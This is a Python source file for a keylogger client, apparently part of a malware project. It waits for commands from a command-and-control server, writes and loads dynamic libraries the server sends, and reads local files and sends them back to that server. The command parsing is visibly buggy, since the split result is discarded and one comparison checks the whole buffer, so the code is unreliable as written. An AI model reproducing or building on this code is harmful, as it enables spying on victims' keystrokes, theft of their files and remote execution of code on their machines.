from client import C2Manager
from client.FileManager import FileManager
from client.DynamicLibManager import DynamicLibManager
from client.keyloggerCallbackWorker import KeyloggerCallbackWorker
from client.TaskDictionary import TaskDictionary


class KeyloggerClient:

    def __init__(self):
        self.__CnCMan = C2Manager.C2Manager()
        self.__CallbackWorker = KeyloggerCallbackWorker()

    def Run(self):
        if not self.__CnCMan.Run():
            return False

        self.__CallbackWorker.Run()
        self.__WaitForCommand()


    def Exit(self):
        pass


    def __WaitForCommand(self):

        while True:
            buffer = self.__CnCMan.C2ManReceive()
            buffer.split(" ")

            if len(buffer) < 1:
                continue

            if len(buffer) > 1:
                path = buffer[1]

                if buffer[0] == "load_dynamic_lib":
                    self.__LoadDynamicLibHandler(path)
                    continue

                if buffer == "send_file":
                    self.__SendFileHandler(path)
                    continue

            if buffer[0] == "exit":
                break
        self.Exit()


    def __LoadDynamicLibHandler(self, path):
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([self.__CnCMan.DoAck]
                                                                           , False))
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([self.__CnCMan.GetFileContent]
                                                                           , True))
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([FileManager.WriteFile, path]
                                                                           , False))
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([DynamicLibManager.LoadDynamicLibrary
                                                                            , path], False))

    def __SendFileHandler(self, path):
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([self.__CnCMan.DoAck]
                                                                           , False))
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([FileManager.ReadFile, path], True))
        self.__CallbackWorker.QueueInsertTask(TaskDictionary.BuildTaskDict([self.__CnCMan.C2ManSend, path]
                                                                           , False))
